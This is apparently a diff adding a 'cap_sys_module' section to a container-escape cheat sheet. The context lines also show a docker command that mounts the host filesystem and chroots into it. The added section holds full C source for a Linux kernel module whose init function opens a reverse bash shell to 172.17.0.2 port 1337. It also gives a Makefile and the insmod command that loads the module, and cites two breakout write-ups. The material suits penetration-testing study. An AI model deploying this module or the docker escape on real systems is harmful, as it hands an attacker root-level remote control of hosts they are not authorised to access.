@@ -68,3 +68,48 @@ docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
 chroot /mnt to change root directory to /mnt
 sh to run shell
 ```
+
+## Abusing `cap_sys_module`
+
+### Install the following requirements
+```bash
+apt update && apt install -y gcc make linux-headers
+```
+
+### Create the kernel module - reverse shell
+```bash
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.2/1337 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+static int __init reverse_shell_init(void) {
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit reverse_shell_exit(void) {
+printk(KERN_INFO "Exiting\n");
+}
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+```
+
+### Create the Makefile
+```bash
+obj-m +=reverse-shell.o
+all:
+	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+clean:
+	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
+```
+
+### Make and install the kenel module
+```bash
+make && insmod reverse-shell.ko
+```
+
+# Sources
+https://blog.nody.cc/posts/container-breakouts-part2/
+https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host
